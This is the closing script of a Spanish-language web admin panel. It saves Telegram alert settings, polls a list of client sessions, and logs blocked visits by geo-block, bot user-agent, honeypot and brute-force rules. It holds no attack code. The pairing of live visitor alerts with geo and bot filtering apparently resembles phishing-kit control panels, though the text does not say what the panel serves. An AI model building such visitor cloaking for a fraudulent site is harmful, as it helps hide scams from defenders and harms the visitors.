  const panel_nombre=document.getElementById('cfg-nombre').value.trim();
  const tg_token=document.getElementById('cfg-token').value.trim();
  const tg_chat=document.getElementById('cfg-chat').value.trim();
  await api('guardar_config',{panel_nombre,tg_token,tg_chat});
  const r=await api('probar_tg',{});
  if(r.enviado) toast('✅ Prueba enviada al chat'); else toast('⚠️ No se pudo enviar (revisa token/chat)');
}
document.getElementById('mAjustes').addEventListener('click',e=>{if(e.target.id==='mAjustes')cerrarAjustes();});
document.getElementById('mPreguntas').addEventListener('click',e=>{if(e.target.id==='mPreguntas')cerrarPreguntas();});

async function limpiarClientes(){
  if(!confirm('¿Borrar TODOS los clientes?'))return;
  const r=await api('purgar',{que:'sesiones'});
  if(r.ok){seen=new Set();lastIds='';await cargar();toast('Lista limpiada');}
}

async function cargarConfig(){
  const r=await api('stats');
  // nombre del panel estático; opcional
}

/* ---- 🚨 Intentos de ataque ---- */
let ATAQUES=[];
const MOTIVOS={
  geo_bloqueado:'🌍 Geo bloqueado',
  ua_bot:'🤖 User-Agent bot',
  honeypot:'🍯 Honeypot',
  ip_repetida:'🔁 IP repetida',
  flood_global:'🌊 Flood global',
  login_brute:'🔐 Brute-force login'
};
async function cargarAtaques(){
  try{
    const r=await api('listar_ataques',{limit:200});
    if(!r.ok)return;
    ATAQUES=r.items||[];
    const tb=document.getElementById('at-body');
    document.getElementById('at-count').textContent=ATAQUES.length;
    document.getElementById('at-last').textContent='actualizado '+new Date().toLocaleTimeString();
    if(!ATAQUES.length){tb.innerHTML='<tr><td colspan="8" style="text-align:center;color:var(--muted);padding:22px">Sin ataques registrados 🟢</td></tr>';return;}
    tb.innerHTML=ATAQUES.map((a,i)=>{
      const mot=a.motivo||'';
      const base=(mot.split(':')[0]);
      const etq=MOTIVOS[base]||mot;
      const extra=(mot.split(':')[1])?(' <code>'+esc(mot.split(':')[1])+'</code>'):'';
      const ubi=[a.ciudad,a.isp].filter(Boolean).join(' · ')||'—';
      return '<tr>'
        +'<td>'+(i+1)+'</td>'
        +'<td style="white-space:nowrap">'+esc(a.ts)+'</td>'
        +'<td><code>'+esc(a.ip)+'</code></td>'
        +'<td><b>'+esc(a.pais||'?')+'</b></td>'
        +'<td>'+esc(ubi)+'</td>'
        +'<td style="color:#c0392b;font-weight:700">'+etq+extra+'</td>'
        +'<td><code style="font-size:11px">'+esc((a.ruta||'').slice(0,40))+'</code></td>'
        +'<td style="font-size:11px;color:var(--muted);max-width:200px;overflow:hidden;text-overflow:ellipsis">'+esc(a.ua||'')+'</td>'
        +'</tr>';
    }).join('');
  }catch(e){}
}
async function limpiarAtaques(){
  if(!confirm('¿Borrar el registro de ataques?'))return;
  const r=await api('purgar_ataques',{});
  if(r.ok){ATAQUES=[];await cargarAtaques();toast('Registro de ataques limpiado');}
}

initTema();
pintarAlarma();
cargar();
cargarAtaques();
setInterval(cargar,3000);
setInterval(cargarAtaques,5000);
</script>
</body>
</html>
